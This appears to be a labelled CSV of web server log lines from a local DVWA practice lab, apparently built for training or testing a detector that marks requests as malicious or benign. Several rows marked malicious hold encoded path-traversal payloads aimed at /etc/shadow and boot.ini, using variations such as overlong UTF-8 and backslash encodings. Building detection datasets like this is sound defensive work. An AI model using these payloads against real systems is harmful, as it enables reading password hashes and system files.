,url,malicious
176,"127.0.0.1 - - [28/Apr/2021:22:30:44 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cshadow HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
199,"127.0.0.1 - - [28/Apr/2021:21:44:08 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
86,"127.0.0.1 - - [28/Apr/2021:22:30:38 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow%5e%5e HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
230,"127.0.0.1 - - [28/Apr/2021:21:42:17 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
134,"127.0.0.1 - - [28/Apr/2021:22:14:52 -0400] ""GET /DVWA/vulnerabilities/fi/?page=a HTTP/1.1"" 200 1352 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
144,"127.0.0.1 - - [28/Apr/2021:22:32:49 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
225,"127.0.0.1 - - [28/Apr/2021:22:51:09 -0400] ""GET /DVWA/vulnerabilities/xss_d/?default=English HTTP/1.1"" 200 1773 ""http://127.0.0.1/DVWA/vulnerabilities/xss_d/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5,"127.0.0.1 - - [28/Apr/2021:22:14:52 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=a"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
192,"127.0.0.1 - - [28/Apr/2021:22:32:37 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
206,"127.0.0.1 - - [28/Apr/2021:22:33:02 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2e%2f%2e%2e%2e%2f%2e%2e%2e%2f%2e%2e%2e%2f%2e%2e%2e%2f HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
36,"127.0.0.1 - - [28/Apr/2021:22:32:29 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
156,"127.0.0.1 - - [28/Apr/2021:22:19:40 -0400] ""GET /DVWA/dvwa/css/login.css HTTP/1.1"" 200 741 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14,"127.0.0.1 - - [28/Apr/2021:22:11:37 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/vulnerabilities/csrf/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
228,"127.0.0.1 - - [28/Apr/2021:22:33:06 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
